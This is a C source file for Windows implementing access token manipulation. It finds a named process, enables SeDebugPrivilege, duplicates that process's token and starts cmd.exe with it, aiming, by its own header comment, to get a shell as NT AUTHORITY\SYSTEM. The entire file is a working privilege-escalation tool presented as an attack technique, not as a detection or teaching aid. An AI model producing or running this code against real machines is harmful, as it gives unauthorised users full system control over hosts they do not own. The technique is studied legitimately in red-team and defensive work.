/*
    Access Token Manipulation - create a new process with a stolen token from other process. The target process is a high-level process 
    running by system so that the program will take it's token, duplicate it then create process to call cmd.exe as system (NT-Authority-System) 
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <wchar.h>

#pragma comment(lib, "ws2_32.lib")

// Print error
void get_error()
{
	wchar_t* s = NULL;
	FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, WSAGetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPWSTR)&s, 0, NULL);
	printf("%ls\n", s);
	LocalFree(s);
}

// Find process name by it's id
int FindProccessIDbyName(const char* proc_name) {
    HANDLE hSnapshot;   // Snapshot handle
    PROCESSENTRY32 pe;  // Process entry
    int pid = 0;
    bool hResult;

    // Create snapshot of all process
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        CloseHandle(hSnapshot);
        return 0;
    }

    pe.dwSize = sizeof(PROCESSENTRY32);

    // Get first process info, then move to the next in a loop
    hResult = Process32First(hSnapshot, &pe);
    while (hResult) {
        if (strcmp(proc_name, (const char*)pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }

        hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

bool SetProcessPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL EnablePrivilege) {

    TOKEN_PRIVILEGES tp; 
    LUID luid;

    // Lookup privilege value
    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        printf("Look up privilege value failed: ");
        get_error();
        return FALSE;
    }

    // Set token privilege luid
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (EnablePrivilege == TRUE) { 
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else {
        tp.Privileges[0].Attributes = 0;
    }
    // Adjust token privilege
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        printf("Adjust token privileges failed: ");
        get_error();
        return FALSE;
    }
    
    return TRUE;

}

int main(int argc, char* argv[]) {
    HANDLE ph;      // Process handle (impersonate remote process)
    HANDLE current_th;      //Token handle if current process
    HANDLE remote_th;       // Token handle of remote process
    HANDLE duplicated_th;       // Duplicated token handle (a copy of target remote process token)
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;
    int impersonate_pid = 0;    // Pid of the process that we will impersonate
    BOOL result = TRUE;

    // Check input params
    if (argc != 2) {
        printf("Usage: %s <process name>\n", argv[0]);
        printf("Example: %s calc.exe\n", argv[0]);
        exit(0);
    }

    // Get pid of target remote process by it's name
    impersonate_pid = FindProccessIDbyName(argv[1]);
    if (impersonate_pid <= 0) {
        printf("Invalid process name");
        exit(0);
    }

    // Get current process's token handle to set privilege
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &current_th)) { 
        printf("Failed to get current process's token handle "); 
        get_error();
        exit(0);
    } 

    // Enable SeDebugPrivilege
    if(SetProcessPrivilege(current_th, SE_DEBUG_NAME, TRUE) == FALSE) {
        printf("Failed to set debug privilege "); 
        get_error();
        exit(0);
    }   

    // Get remote process's token handle
    ph = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, (DWORD)impersonate_pid);
    if (!OpenProcessToken(ph, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &remote_th)) { 
        printf("Failed to get remote process's token handle "); 
        get_error();
        exit(0);
    }

    // Duplicate the token of remote process
    if (!DuplicateTokenEx(remote_th, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicated_th)) {
        printf("Failed to duplicate remote process's token "); 
        get_error();
        exit(0);
    }

    // Create process with the duplicated token
    memset(&sui, 0, sizeof(STARTUPINFO));
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    sui.cb = sizeof(STARTUPINFO);
    CreateProcessWithTokenW(duplicated_th, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, (STARTUPINFOW*)&sui, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(current_th);
    CloseHandle(remote_th);
    CloseHandle(duplicated_th);
    CloseHandle(ph);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
